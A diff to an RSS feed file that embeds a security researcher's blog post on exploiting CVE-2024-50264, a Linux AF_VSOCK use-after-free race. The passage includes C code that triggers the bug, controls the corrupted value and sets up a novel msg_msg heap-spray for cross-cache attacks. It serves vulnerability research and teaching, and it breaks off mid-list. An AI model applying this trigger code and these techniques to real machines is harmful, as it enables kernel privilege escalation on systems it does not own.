@@ -4,12 +4,868 @@
         <title>HN100 - Readable Contents</title>
         <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
         <description>Uses Readability to add bodies to the RSS feed</description>
-        <lastBuildDate>Wed, 03 Sep 2025 09:30:04 GMT</lastBuildDate>
+        <lastBuildDate>Wed, 03 Sep 2025 10:30:03 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>https://github.com/jpmonette/feed</generator>
         <language>en</language>
         <item>
-            <title><![CDATA[Finnish City Inaugurates 1 MW/100 MWh Sand Battery (119 pts)]]></title>
+            <title><![CDATA[Kernel-hack-drill and exploiting CVE-2024-50264 in the Linux kernel (105 pts)]]></title>
+            <link>https://a13xp0p0v.github.io/2025/09/02/kernel-hack-drill-and-CVE-2024-50264.html</link>
+            <guid>45112996</guid>
+            <pubDate>Wed, 03 Sep 2025 06:58:51 GMT</pubDate>
+            <description><![CDATA[<p>URL: <a href="https://a13xp0p0v.github.io/2025/09/02/kernel-hack-drill-and-CVE-2024-50264.html">https://a13xp0p0v.github.io/2025/09/02/kernel-hack-drill-and-CVE-2024-50264.html</a>, See on <a href="https://news.ycombinator.com/item?id=45112996">Hacker News</a></p>
+<div id="readability-page-1" class="page"><div aria-label="Content">
+        <article itemscope="" itemtype="http://schema.org/BlogPosting">
+
+  
+
+  <div itemprop="articleBody">
+    <p>Some memory corruption bugs are much harder to exploit than others. They can involve race conditions, crash the system, and impose limitations that make a researcher's life difficult. Working with such fragile vulnerabilities demands significant time and effort. CVE-2024-50264 in the Linux kernel is one such hard bug, which received the Pwnie Award 2025 as the Best Privilege Escalation. In this article, I introduce my personal project <a href="https://github.com/a13xp0p0v/kernel-hack-drill">kernel-hack-drill</a> and show how it helped me to exploit CVE-2024-50264.</p>
+
+<h2 id="bug-collision-story">Bug collision story</h2>
+
+<p>I first found a bug in <code>AF_VSOCK</code> back in 2021 and published the article <a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel</a>. In April 2024, I was fuzzing this kernel subsystem with a customized syzkaller and found another crash in <code>AF_VSOCK</code>. I minimized the crash reproducer and disabled KASAN. This resulted in an immediate null-ptr-deref in a kernel worker (<code>kworker</code>). Convinced the path forward would be painful, I shelved the bug. This was a wrong decision.</p>
+
+<p>Later, in autumn 2024, I decided to look at this bug again and got promising results. Then, one calm evening, I realized I'd collided with Hyunwoo Kim (<a href="https://x.com/v4bel">@v4bel</a>) and Wongi Lee (<a href="https://x.com/_qwerty_po">@qwerty</a>): they'd already disclosed the bug as CVE-2024-50264 and used it at kernelCTF. <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/vmw_vsock?id=6ca575374dd9a507cdd16dfa0e78c2e9e20bd05f">Their patch</a> turned my PoC exploit into a null-ptr-deref:</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/vsock_patch.png" width="90%"></center>
+
+
+<p>Anyone who has dealt with a bug collision can imagine what I felt. I was wondering whether to keep digging into this vulnerability or just give it up.</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/Vityaz.jpg" width="80%"><br>Viktor Vasnetsov: Vityaz at the Crossroads (1882)</center>
+
+
+<p>The <a href="https://github.com/google/security-research/pull/145/files">exploit strategy</a> by @v4bel and @qwerty looked very complicated. I had other ideas, so I decided to continue my research. I chose Ubuntu Server 24.04 with a fresh OEM/HWE kernel (v6.11) as the target for my PoC exploit.</p>
+
+<h2 id="cve-2024-50264-analysis">CVE-2024-50264 analysis</h2>
+
+<p>The vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-50264">CVE-2024-50264</a> was introduced in August 2016 by commit <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/vmw_vsock?id=06a8fc78367d070720af960dcecec917d3ae5f3b">06a8fc78367d</a> in Linux v4.8. It is a race condition in <code>AF_VSOCK</code> sockets that happens between the <code>connect()</code> system call and a POSIX signals, resulting in a use-after-free (UAF). An unprivileged user can trigger this bug without user namespaces, which makes it more dangerous.</p>
+
+<p>The kernel uses a freed <code>virtio_vsock_sock</code> object. Its size is 80 bytes, which is suitable for the <code>kmalloc-96</code> slab cache. The memory corruption is a UAF write executed by a kernel worker.</p>
+
+<p>However, this vulnerability also brings a bunch of nasty limitations for exploitation. I can say that <strong>it's the worst bug to exploit I've ever seen</strong>. The Pwnie Award is well-deserved. I'll outline those constraints shortly.</p>
+
+<h2 id="reproducing-the-bug-using-an-immortal-signal">Reproducing the bug using an "immortal signal"</h2>
+
+<p>First, an attacker should create a listening virtual socket (server vsock):</p>
+<div><pre><code><span>int</span> <span>ret</span> <span>=</span> <span>-</span><span>1</span><span>;</span>
+<span>int</span> <span>vsock1</span> <span>=</span> <span>0</span><span>;</span>
+
+<span>vsock1</span> <span>=</span> <span>socket</span><span>(</span><span>AF_VSOCK</span><span>,</span> <span>SOCK_STREAM</span><span>,</span> <span>0</span><span>);</span>
+<span>if</span> <span>(</span><span>vsock1</span> <span>&lt;</span> <span>0</span><span>)</span>
+	<span>err_exit</span><span>(</span><span>"[-] creating vsock"</span><span>);</span>
+
+<span>ret</span> <span>=</span> <span>bind</span><span>(</span><span>vsock1</span><span>,</span> <span>(</span><span>struct</span> <span>sockaddr</span> <span>*</span><span>)</span><span>&amp;</span><span>addr</span><span>,</span> <span>sizeof</span><span>(</span><span>struct</span> <span>sockaddr_vm</span><span>));</span>
+<span>if</span> <span>(</span><span>ret</span> <span>!=</span> <span>0</span><span>)</span>
+	<span>err_exit</span><span>(</span><span>"[-] binding vsock"</span><span>);</span>
+
+<span>ret</span> <span>=</span> <span>listen</span><span>(</span><span>vsock1</span><span>,</span> <span>0</span><span>);</span> <span>/* backlog = 0 */</span>
+<span>if</span> <span>(</span><span>ret</span> <span>!=</span> <span>0</span><span>)</span>
+	<span>err_exit</span><span>(</span><span>"[-] listening vsock"</span><span>);</span>
+</code></pre></div>
+
+<p>Then the attacker should try to open a connection from a client vsock:</p>
+<div><pre><code><span>#define UAF_PORT 0x2712
+</span>
+<span>int</span> <span>vsock2</span> <span>=</span> <span>0</span><span>;</span>
+<span>struct</span> <span>sockaddr_vm</span> <span>addr</span> <span>=</span> <span>{</span>
+	<span>.</span><span>svm_family</span> <span>=</span> <span>AF_VSOCK</span><span>,</span>
+	<span>.</span><span>svm_port</span> <span>=</span> <span>UAF_PORT</span><span>,</span>
+	<span>.</span><span>svm_cid</span> <span>=</span> <span>VMADDR_CID_LOCAL</span>
+<span>};</span>
+
+<span>vsock2</span> <span>=</span> <span>socket</span><span>(</span><span>AF_VSOCK</span><span>,</span> <span>SOCK_STREAM</span><span>,</span> <span>0</span><span>);</span>
+<span>if</span> <span>(</span><span>vsock2</span> <span>&lt;</span> <span>0</span><span>)</span>
+	<span>err_exit</span><span>(</span><span>"[-] creating vsock"</span><span>);</span>
+
+<span>ret</span> <span>=</span> <span>connect</span><span>(</span><span>vsock2</span><span>,</span> <span>(</span><span>struct</span> <span>sockaddr</span> <span>*</span><span>)</span><span>&amp;</span><span>addr</span><span>,</span> <span>sizeof</span><span>(</span><span>struct</span> <span>sockaddr_vm</span><span>));</span>
+</code></pre></div>
+
+<p>To trigger the bug, the attacker should interrupt this <code>connect()</code> system call with a POSIX signal. @v4bel &amp; @qwerty used <code>SIGKILL</code>, but that kills the exploit process. My fuzzer stumbled on a cleaner trick that surprised me:</p>
+
+<div><pre><code><span>struct</span> <span>sigevent</span> <span>sev</span> <span>=</span> <span>{};</span>
+<span>timer_t</span> <span>race_timer</span> <span>=</span> <span>0</span><span>;</span>
+
+<span>sev</span><span>.</span><span>sigev_notify</span> <span>=</span> <span>SIGEV_SIGNAL</span><span>;</span>
+<span>sev</span><span>.</span><span>sigev_signo</span> <span>=</span> <span>33</span><span>;</span>
+<span>ret</span> <span>=</span> <span>timer_create</span><span>(</span><span>CLOCK_MONOTONIC</span><span>,</span> <span>&amp;</span><span>sev</span><span>,</span> <span>&amp;</span><span>race_timer</span><span>);</span>
+</code></pre></div>
+
+<p>My fuzzer discovered that a timer can fire signal 33 and interrupt <code>connect()</code>. Signal 33 is special. The Native POSIX Threads Library (NPTL) keeps it for internal work and the operating system quietly shields applications from it. As <code>man 7 nptl</code> explains:</p>
+
+<blockquote>
+  <p>NPTL makes internal use of the first two real-time signals (signal numbers 32 and 33).
+One of these signals is used to support thread cancellation and POSIX timers (see <code>timer_create(2)</code>);
+the other is used as part of a mechanism that ensures all threads in a process always have
+the same UIDs and GIDs, as required by POSIX. These signals cannot be used in applications.</p>
+</blockquote>
+
+<p>True, these signals cannot be used in applications, but they are perfect for my exploit 😉</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/secret.jpeg" width="50%"></center>
+
+
+<p>I use <code>timer_settime()</code> for <code>race_timer</code>, which lets me choose the exact moment signal 33 interrupts <code>connect()</code>. Moreover, the signal is invisible to the exploit process and doesn't kill it.</p>
+
+<h2 id="about-memory-corruption">About memory corruption</h2>
+
+<p>The race condition succeeds when a signal interrupts the <code>connect()</code> system call while the vulnerable socket is in the <code>TCP_ESTABLISHED</code> state. The socket then <a href="https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/af_vsock.c#L1475">drops into</a> the <code>TCP_CLOSING</code> state:</p>
+
+<div><pre><code><span>if</span> <span>(</span><span>signal_pending</span><span>(</span><span>current</span><span>))</span> <span>{</span>
+	<span>err</span> <span>=</span> <span>sock_intr_errno</span><span>(</span><span>timeout</span><span>);</span>
+	<span>sk</span><span>-&gt;</span><span>sk_state</span> <span>=</span> <span>sk</span><span>-&gt;</span><span>sk_state</span> <span>==</span> <span>TCP_ESTABLISHED</span> <span>?</span> <span>TCP_CLOSING</span> <span>:</span> <span>TCP_CLOSE</span><span>;</span>
+	<span>sock</span><span>-&gt;</span><span>state</span> <span>=</span> <span>SS_UNCONNECTED</span><span>;</span>
+	<span>vsock_transport_cancel_pkt</span><span>(</span><span>vsk</span><span>);</span>
+	<span>vsock_remove_connected</span><span>(</span><span>vsk</span><span>);</span>
+	<span>goto</span> <span>out_wait</span><span>;</span>
+<span>}</span>
+</code></pre></div>
+
+<p>The second attempt to connect the vulnerable vsock to the server vsock using a different <code>svm_cid</code> (<code>VMADDR_CID_HYPERVISOR</code>) provokes memory corruption.</p>
+
+<div><pre><code><span>struct</span> <span>sockaddr_vm</span> <span>addr</span> <span>=</span> <span>{</span>
+	<span>.</span><span>svm_family</span> <span>=</span> <span>AF_VSOCK</span><span>,</span>
+	<span>.</span><span>svm_port</span> <span>=</span> <span>UAF_PORT</span><span>,</span>
+	<span>.</span><span>svm_cid</span> <span>=</span> <span>VMADDR_CID_HYPERVISOR</span>
+<span>};</span>
+
+<span>/* this connect will schedule the kernel worker performing UAF */</span>
+<span>ret</span> <span>=</span> <span>connect</span><span>(</span><span>vsock2</span><span>,</span> <span>(</span><span>struct</span> <span>sockaddr</span> <span>*</span><span>)</span><span>&amp;</span><span>addr</span><span>,</span> <span>sizeof</span><span>(</span><span>struct</span> <span>sockaddr_vm</span><span>));</span>
+</code></pre></div>
+
+<p>Under the hood, the <code>connect()</code> system call <a href="https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/af_vsock.c#L439">executes</a> <code>vsock_assign_transport()</code>. This function switches the virtual socket to the new <code>svm_cid</code> transport and frees the resources tied to the previous vsock transport:</p>
+<div><pre><code><span>if</span> <span>(</span><span>vsk</span><span>-&gt;</span><span>transport</span><span>)</span> <span>{</span>
+	<span>if</span> <span>(</span><span>vsk</span><span>-&gt;</span><span>transport</span> <span>==</span> <span>new_transport</span><span>)</span>
+		<span>return</span> <span>0</span><span>;</span>
+
+	<span>/* transport-&gt;release() must be called with sock lock acquired.
+	 * This path can only be taken during vsock_connect(), where we
+	 * have already held the sock lock. In the other cases, this
+	 * function is called on a new socket which is not assigned to
+	 * any transport.
+	 */</span>
+	<span>vsk</span><span>-&gt;</span><span>transport</span><span>-&gt;</span><span>release</span><span>(</span><span>vsk</span><span>);</span>
+	<span>vsock_deassign_transport</span><span>(</span><span>vsk</span><span>);</span>
+<span>}</span>
+</code></pre></div>
+
+<p>This procedure <a href="https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/virtio_transport_common.c#L1214">closes</a> the old vsock transport in <code>virtio_transport_close()</code> and <a href="https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/virtio_transport_common.c#L1085">frees</a> the <code>virtio_vsock_sock</code> object in <code>virtio_transport_destruct()</code>. However, due to the erroneous <code>TCP_CLOSING</code> state of the socket, <code>virtio_transport_close()</code> initiates further communication. To handle that activity, the kernel schedules a <code>kworker</code> that eventually calls <code>virtio_transport_space_update()</code>, which <a href="https://elixir.bootlin.com/linux/v6.11.7/source/net/vmw_vsock/virtio_transport_common.c#L1434">operates</a> on the freed structure:</p>
+
+<div><pre><code><span>static</span> <span>bool</span> <span>virtio_transport_space_update</span><span>(</span><span>struct</span> <span>sock</span> <span>*</span><span>sk</span><span>,</span> <span>struct</span> <span>sk_buff</span> <span>*</span><span>skb</span><span>)</span>
+<span>{</span>
+	<span>struct</span> <span>virtio_vsock_hdr</span> <span>*</span><span>hdr</span> <span>=</span> <span>virtio_vsock_hdr</span><span>(</span><span>skb</span><span>);</span>
+	<span>struct</span> <span>vsock_sock</span> <span>*</span><span>vsk</span> <span>=</span> <span>vsock_sk</span><span>(</span><span>sk</span><span>);</span>
+	<span>struct</span> <span>virtio_vsock_sock</span> <span>*</span><span>vvs</span> <span>=</span> <span>vsk</span><span>-&gt;</span><span>trans</span><span>;</span> <span>/* ptr to freed object */</span>
+	<span>bool</span> <span>space_available</span><span>;</span>
+
+	<span>if</span> <span>(</span><span>!</span><span>vvs</span><span>)</span>
+		<span>return</span> <span>true</span><span>;</span>
+
+	<span>spin_lock_bh</span><span>(</span><span>&amp;</span><span>vvs</span><span>-&gt;</span><span>tx_lock</span><span>);</span> <span>/* proceed if 4 bytes are zero (UAF write non-zero to lock) */</span>
+	<span>vvs</span><span>-&gt;</span><span>peer_buf_alloc</span> <span>=</span> <span>le32_to_cpu</span><span>(</span><span>hdr</span><span>-&gt;</span><span>buf_alloc</span><span>);</span> <span>/* UAF write 4 bytes */</span>
+	<span>vvs</span><span>-&gt;</span><span>peer_fwd_cnt</span> <span>=</span> <span>le32_to_cpu</span><span>(</span><span>hdr</span><span>-&gt;</span><span>fwd_cnt</span><span>);</span> <span>/* UAF write 4 bytes */</span>
+	<span>space_available</span> <span>=</span> <span>virtio_transport_has_space</span><span>(</span><span>vsk</span><span>);</span> <span>/* UAF read, not interesting */</span>
+	<span>spin_unlock_bh</span><span>(</span><span>&amp;</span><span>vvs</span><span>-&gt;</span><span>tx_lock</span><span>);</span> <span>/* UAF write, restore 4 zero bytes */</span>
+	<span>return</span> <span>space_available</span><span>;</span>
+<span>}</span>
+</code></pre></div>
+
+<p>The following diagram shows the layout of the UAF in the vulnerable object:</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/uaf_write.png"></center>
+
+
+<p>Here in yellow I show the <code>tx_lock</code> field that must be zero. Otherwise, the kernel hangs while trying to acquire the spinlock. In red I show the <code>peer_buf_alloc</code> and <code>peer_fwd_cnt</code> fields that are overwritten after the object is freed. There is no pointer dereference in the freed object.</p>
+
+<p>The value written to <code>virtio_vsock_sock.peer_buf_alloc</code> can be controlled from the userspace:</p>
+
+<div><pre><code><span>/* Increase the range for the value that we want to write during UAF: */</span>
+<span>uaf_val_limit</span> <span>=</span> <span>0x1lu</span><span>;</span> <span>/* can't be zero */</span>
+<span>setsockopt</span><span>(</span><span>vsock1</span><span>,</span> <span>PF_VSOCK</span><span>,</span> <span>SO_VM_SOCKETS_BUFFER_MIN_SIZE</span><span>,</span>
+           <span>&amp;</span><span>uaf_val_limit</span><span>,</span> <span>sizeof</span><span>(</span><span>uaf_val_limit</span><span>));</span>
+<span>uaf_val_limit</span> <span>=</span> <span>0xfffffffflu</span><span>;</span>
+<span>setsockopt</span><span>(</span><span>vsock1</span><span>,</span> <span>PF_VSOCK</span><span>,</span> <span>SO_VM_SOCKETS_BUFFER_MAX_SIZE</span><span>,</span>
+           <span>&amp;</span><span>uaf_val_limit</span><span>,</span> <span>sizeof</span><span>(</span><span>uaf_val_limit</span><span>));</span>
+
+<span>/* Set the 4-byte value that we want to write during UAF: */</span>
+<span>setsockopt</span><span>(</span><span>vsock1</span><span>,</span> <span>PF_VSOCK</span><span>,</span> <span>SO_VM_SOCKETS_BUFFER_SIZE</span><span>,</span>
+           <span>&amp;</span><span>uaf_val</span><span>,</span> <span>sizeof</span><span>(</span><span>uaf_val</span><span>));</span>
+</code></pre></div>
+
+<p>The field <code>virtio_vsock_sock.peer_fwd_cnt</code> tracks how many bytes have been pushed through vsock using <code>sendmsg()</code>/<code>recvmsg()</code>. It is zero by default (four zero bytes).</p>
+
+<h2 id="not-so-fast-cve-2024-50264-has-limitations">Not so fast. CVE-2024-50264 has limitations</h2>
+
+<p>As I mentioned earlier, this vulnerability has a lot of nasty limitations for the exploitation:</p>
+
+<ol>
+  <li>The vulnerable <code>virtio_vsock_sock</code> client object is allocated together with the server object from the same slab cache. That disturbs cross-cache attacks.</li>
+  <li>Reproducing this race condition is very unstable.</li>
+  <li>The UAF write occurs in a kworker a few microseconds after <code>kfree()</code>, too quickly for typical cross-cache attacks.</li>
+  <li>A null-ptr-deref in the kworker follows the UAF write. That's why I shelved the bug at first.</li>
+  <li>Even if that kernel oops is avoided, another null-ptr-deref occurs in the kworker after <code>VSOCK_CLOSE_TIMEOUT</code> (eight seconds).</li>
+  <li>The kworker hangs in <code>spin_lock_bh()</code> if <code>virtio_vsock_sock.tx_lock</code> is not zero, as noted above.</li>
+</ol>
+
+<p>I uncovered each obstacle one by one while developing the PoC exploit for CVE-2024-50264. It remains the worst bug to exploit I've ever seen. I guess that's why it received the Pwnie Award 2025 as the Best Privilege Escalation.</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/mario.jpg" width="80%"></center>
+
+
+<h2 id="first-thoughts-on-exploit-strategy">First thoughts on exploit strategy</h2>
+
+<p>The exploit strategy by @v4bel and @qwerty was complex:</p>
+
+<ol>
+  <li>A large-scale BPF JIT spray that filled a significant portion of physical memory</li>
+  <li>The <a href="https://github.com/IAIK/SLUBStick">SLUBStick technique</a> from Graz University of Technology, which allowed to:
+    <ul>
+      <li>Determine the number of objects in the active slab using a timing side channel</li>
+      <li>Then, place the client and server <code>virtio_vsock_sock</code> objects in different slabs, landing one at the end of its slab and the other at the start of the next slab</li>
+    </ul>
+  </li>
+  <li>The <a href="https://web.archive.org/web/20250226150503/https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty Pagetable</a> technique, which allowed to use the UAF object for overwriting a page table entry (PTE)</li>
+  <li>Modifying a PTE to make it possibly point to a BPF JIT region</li>
+  <li>Inserting a privilege-escalation payload into the BPF code</li>
+  <li>Communicating via a socket to execute the privilege-escalation payload.</li>
+</ol>
+
+<center><img src="https://a13xp0p0v.github.io/img/grumpy12.jpeg" width="80%"></center>
+
+
+<p>I felt I could make the PoC exploit for CVE-2024-50264 much simpler. My first thought was to steer the UAF write into some victim object and build a useful exploit primitive around it.</p>
+
+<p>I decided not to search victim objects inside the <code>kmalloc-96</code> slab cache. Ubuntu Server 24.04 ships with <code>kconfig</code> options that neutralize naive heap spraying for UAF exploitation:</p>
+<ul>
+  <li><code>CONFIG_SLAB_BUCKETS=y</code>, which creates a set of separate slab caches for allocations with user-controlled data</li>
+  <li><code>CONFIG_RANDOM_KMALLOC_CACHES=y</code>. Here's a quote from the kernel documentation about it:
+    <blockquote>
+      <p>It is a hardening feature that creates multiple copies of slab caches for normal kmalloc allocation and makes kmalloc randomly pick one based on code address, which makes the attackers more difficult to spray vulnerable memory objects on the heap for the purpose of exploiting memory vulnerabilities.</p>
+    </blockquote>
+  </li>
+</ul>
+
+<p>That's why I decided to perform the cross-cache attack anyway.</p>
+
+<p>The first victim object I decided to try was <code>struct cred</code>. Its size is 184 bytes, and the kernel allocates these objects in slabs of size 192 bytes. That would allow only two possible offsets of the UAF in the victim <code>cred</code>, because slabs for the vulnerable <code>virtio_vsock_sock</code> have size 96 bytes (half of 192). The diagram below shows how two vulnerable <code>virtio_vsock_sock</code> objects overlap the <code>cred</code> object. The memory corruption may happen on one of the <code>virtio_vsock_sock</code> objects.</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/uaf_write_cred2.png" width="80%"></center>
+
+
+<p>Unfortunately, <code>struct cred</code> reallocated at the place of the freed <code>virtio_vsock_sock</code> objects doesn't provide anything useful for the attacker:</p>
+<ul>
+  <li>If the UAF happened on the first <code>virtio_vsock_sock</code>, the kernel would hang in <code>spin_lock_bh()</code>, because <code>cred</code> has a non-null <code>uid</code> value at the place of <code>virtio_vsock_sock.tx_lock</code>.</li>
+  <li>If the UAF happened on the second <code>virtio_vsock_sock</code>, writing controlled data to <code>virtio_vsock_sock.peer_buf_alloc</code> would corrupt the <code>cred.request_key_auth</code> pointer. I had no idea how to use it without a prior infoleak.</li>
+</ul>
+
+<p>The <code>cred</code> object didn't work for me, so I started to search for the next candidate. My next victim object for the memory corruption was <code>msg_msg</code>. I like this object: I first used it for heap spraying in 2021 (you can find the details in the article <a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">"Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel"</a>).</p>
+
+<p>It was a novel approach back then. This time, I set out to create something new again.</p>
+
+<p>I chose a 96-byte <code>msg_msg</code> because the slab allocator would use slabs of the same size for this <code>msg_msg</code> and <code>virtio_vsock_sock</code>. That would allow the UAF write to land at a fixed offset in the victim <code>msg_msg</code> object. The following diagram shows what happens with the <code>msg_msg</code> object allocated at the place of the freed <code>virtio_vsock_sock</code>:</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/uaf_write_msg_msg.png" width="90%"></center>
+
+
+<p>The <code>msg_msg.m_list.prev</code> is the kernelspace pointer to the previous object in the linked list. This pointer is zero when <code>msg_msg</code> is created (see <code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</code>) and then it is initialized with a non-null value when <code>msg_msg</code> <a href="https://elixir.bootlin.com/linux/v6.15.5/source/ipc/msg.c#L941">is inserted</a> into the message queue. Unfortunately, this non-null pointer is interpreted as <code>virtio_vsock_sock.tx_lock</code>. That makes the <code>virtio_transport_space_update()</code> function hang while executing <code>spin_lock_bh()</code>.</p>
+
+<p>To bypass this restriction, I needed the kernel to initialize <code>msg_msg.m_list.prev</code> after the UAF write. I looked for a way to postpone placing <code>msg_msg</code> in the message queue and eventually found the solution.</p>
+
+<h2 id="msg_msg-spray-allowing-m_list-field-corruption-novel-technique">msg_msg spray allowing m_list field corruption (novel technique)</h2>
+
+<ol>
+  <li>I filled the message queue almost completely before sending the target <code>msg_msg</code>.
+    <ul>
+      <li>The message queue size is <code>MSGMNB=16384</code> bytes.</li>
+      <li>I sent 2 clogging messages of 8191 bytes each without calling the <code>msgrcv()</code> syscall.</li>
+      <li>Only 2 bytes were left in the queue.</li>
+      <li>I used <code>mtype = 1</code> for these messages.</li>
+    </ul>
+  </li>
+  <li>Then I performed spraying by calling <code>msgsnd()</code> for the target <code>msg_msg</code> objects.
+    <ul>
+      <li>I called the <code>msgsnd()</code> syscall in separate pthreads and used <code>mtype = 2</code> for these messages to distinguish them from the clogging messages.</li>
+      <li>The kernel allocates target <code>msg_msg</code> and then blocks <code>msgsnd()</code> in <code>ipc/msg.c</code> while it <a href="https://elixir.bootlin.com/linux/v6.15.5/source/ipc/msg.c#L900">waits for space</a> in the message queue:</li>
+    </ul>
+
+    <div><pre><code> 	<span>if</span> <span>(</span><span>msg_fits_inqueue</span><span>(</span><span>msq</span><span>,</span> <span>msgsz</span><span>))</span>
+ 		<span>break</span><span>;</span>
+    
+ 	<span>/* queue full, wait: */</span>
+ 	<span>if</span> <span>(</span><span>msgflg</span> <span>&amp;</span> <span>IPC_NOWAIT</span><span>)</span> <span>{</span>
+ 		<span>err</span> <span>=</span> <span>-</span><span>EAGAIN</span><span>;</span>
+ 		<span>goto</span> <span>out_unlock0</span><span>;</span>
+ 	<span>}</span>
+    
+ 	<span>/* enqueue the sender and prepare to block */</span>
+ 	<span>ss_add</span><span>(</span><span>msq</span><span>,</span> <span>&amp;</span><span>s</span><span>,</span> <span>msgsz</span><span>);</span>
+    
+ 	<span>if</span> <span>(</span><span>!</span><span>ipc_rcu_getref</span><span>(</span><span>&amp;</span><span>msq</span><span>-&gt;</span><span>q_perm</span><span>))</span> <span>{</span>
+ 		<span>err</span> <span>=</span> <span>-</span><span>EIDRM</span><span>;</span>
+ 		<span>goto</span> <span>out_unlock0</span><span>;</span>
+ 	<span>}</span>
+    
+ 	<span>ipc_unlock_object</span><span>(</span><span>&amp;</span><span>msq</span><span>-&gt;</span><span>q_perm</span><span>);</span>
+ 	<span>rcu_read_unlock</span><span>();</span>
+ 	<span>schedule</span><span>();</span>
+</code></pre></div>
+
+    <center><img src="https://a13xp0p0v.github.io/img/train_msg_msg.jpg" width="80%"></center>
+    
+  </li>
+  <li>
+    <p>While the <code>msgsnd()</code> syscalls were waiting for space in the message queue, I performed the UAF write corrupting the <code>m_list</code>, <code>m_type</code>, and <code>m_ts</code> fields of one of the target <code>msg_msg</code> objects.</p>
+  </li>
+  <li>
+    <p>After the UAF write, I called <code>msgrcv()</code> for type 1 clogging messages.</p>
+  </li>
+  <li>Then the blocked <code>msgsnd()</code> syscall woke up to add the sprayed <code>msg_msg</code> to the queue and <a href="https://elixir.bootlin.com/linux/v6.15.5/source/ipc/msg.c#L941">the kernel fixed</a> the corrupted <code>m_list</code> field:
+    <div><pre><code> 	<span>if</span> <span>(</span><span>!</span><span>pipelined_send</span><span>(</span><span>msq</span><span>,</span> <span>msg</span><span>,</span> <span>&amp;</span><span>wake_q</span><span>))</span> <span>{</span>
+ 		<span>/* no one is waiting for this message, enqueue it */</span>
+ 		<span>list_add_tail</span><span>(</span><span>&amp;</span><span>msg</span><span>-&gt;</span><span>m_list</span><span>,</span> <span>&amp;</span><span>msq</span><span>-&gt;</span><span>q_messages</span><span>);</span>
+ 		<span>msq</span><span>-&gt;</span><span>q_cbytes</span> <span>+=</span> <span>msgsz</span><span>;</span>
+ 		<span>msq</span><span>-&gt;</span><span>q_qnum</span><span>++</span><span>;</span>
+ 		<span>percpu_counter_add_local</span><span>(</span><span>&amp;</span><span>ns</span><span>-&gt;</span><span>percpu_msg_bytes</span><span>,</span> <span>msgsz</span><span>);</span>
+ 		<span>percpu_counter_add_local</span><span>(</span><span>&amp;</span><span>ns</span><span>-&gt;</span><span>percpu_msg_hdrs</span><span>,</span> <span>1</span><span>);</span>
+ 	<span>}</span>
+</code></pre></div>
+  </li>
+</ol>
+
+<p>Cool! This technique is also useful for blind overwriting of <code>msg_msg</code> using the out-of-bounds write. No kernel infoleak is needed. The kernel restores the corrupted <code>m_list</code> pointers. In my particular case, this approach allowed me to avoid <code>virtio_transport_space_update()</code> hanging in <code>spin_lock_bh()</code>:</p>
+
+<center><img src="https://a13xp0p0v.github.io/img/uaf_write_msg_msg2.png" width="90%"></center>
+
+
+<p>To implement the UAF write into an <code>msg_msg</code> object, I needed to perform cross-cache attack turning <code>virtio_vsock_sock</code> into <code>msg_msg</code>. On Ubuntu Server 24.04, the <code>virtio_vsock_sock</code> objects live in one of 16 <code>kmalloc-rnd-?-96</code> slab caches enabled by <code>CONFIG_RANDOM_KMALLOC_CACHES</code>. The <code>msg_msg</code> objects live in a dedicated <code>msg_msg-96</code> slab cache enabled by <code>CONFIG_SLAB_BUCKETS</code>.</p>
+
+<p>To implement the cross-cache attack, I needed to learn how these attacks work on the latest Ubuntu kernel, but testing exploit primitives together with this crazy race condition was really painful. Then, I got an idea:</p>
+
+<blockquote>
+  <p>If an unstable race condition creates problems, let's use a testing ground for developing the exploit primitives!</p>
+</blockquote>
+
+
+
+<p>Back in 2017, I created a pet project for my students called <a href="https://github.com/a13xp0p0v/kernel-hack-drill">kernel-hack-drill</a>. It provides a test environment for learning and experimenting with Linux kernel exploits. I remembered it and decided to use <code>kernel-hack-drill</code> to develop the exploit primitives for CVE-2024-50264.</p>
+
+<p><code>kernel-hack-drill</code> is an open-source project published under the <code>GPL-3.0</code> license. It contains the following parts:</p>
+<ul>
+  <li><code>drill_mod.c</code> is a small Linux kernel module that provides the <code>/proc/drill_act</code> file as a simple interface to userspace. This module contains vulnerabilities that you can control and experiment with.</li>
+  <li><code>drill.h</code> is a header file describing the <code>drill_mod.ko</code> interface:
+    <div><pre><code><span>enum</span> <span>drill_act_t</span> <span>{</span>
+	<span>DRILL_ACT_NONE</span> <span>=</span> <span>0</span><span>,</span>
+	<span>DRILL_ACT_ALLOC</span> <span>=</span> <span>1</span><span>,</span>
+	<span>DRILL_ACT_CALLBACK</span> <span>=</span> <span>2</span><span>,</span>
+	<span>DRILL_ACT_SAVE_VAL</span> <span>=</span> <span>3</span><span>,</span>
+	<span>DRILL_ACT_FREE</span> <span>=</span> <span>4</span><span>,</span>
+	<span>DRILL_ACT_RESET</span> <span>=</span> <span>5</span>
+<span>};</span>
+  
+<span>#define DRILL_ITEM_SIZE 95
+</span>  
+<span>struct</span> <span>drill_item_t</span> <span>{</span>
+	<span>unsigned</span> <span>long</span> <span>foobar</span><span>;</span>
+	<span>void</span> <span>(</span><span>*</span><span>callback</span><span>)(</span><span>void</span><span>);</span>
+	<span>char</span> <span>data</span><span>[];</span> <span>/* C99 flexible array */</span>
+<span>};</span>
+  
+<span>#define DRILL_N 10240
+</span></code></pre></div>
+  </li>
